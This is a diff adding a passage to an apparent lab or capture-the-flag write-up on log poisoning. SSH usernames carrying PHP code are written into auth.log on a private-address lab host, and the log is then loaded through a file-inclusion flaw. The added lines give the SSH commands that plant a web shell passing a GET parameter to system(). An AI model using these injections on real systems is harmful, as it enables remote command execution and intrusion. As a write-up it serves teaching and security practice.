@@ -100,3 +100,14 @@ It is possible to use the auth.log file to inject PHP code into a page, but it i
 The first step is to enumerate just how many characters we have to work with. After all, we only get one shot at this. If we inject a PHP snippet and it gets cut off before we get a chance to close it, the entire auth.log file will be useless to us until it rolls over. So I tried:
 
 `ssh "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@192.168.56.101"`
+
+By examining how many characters of the username made it into the included auth.log file, I was able to ascertain my character limit: 30 characters. This is difficult to work with, but doable. Next I tried injecting a simple PHP snippet to test that injection is actually possible
+
+`ssh "<?php echo 'test'; ?>"@192.168.56.101`
+
+This worked, and I could see the word "test" appearing in the contents of auth.log. After a little tinkering on my own machine to avoid breaking auth.log, I came up with the following series of injections:
+
+```
+ssh "<?php \$a=\$_GET['a']?>"@192.168.56.101
+ssh "<?php echo system(\$a)?> "@192.168.56.101
+```
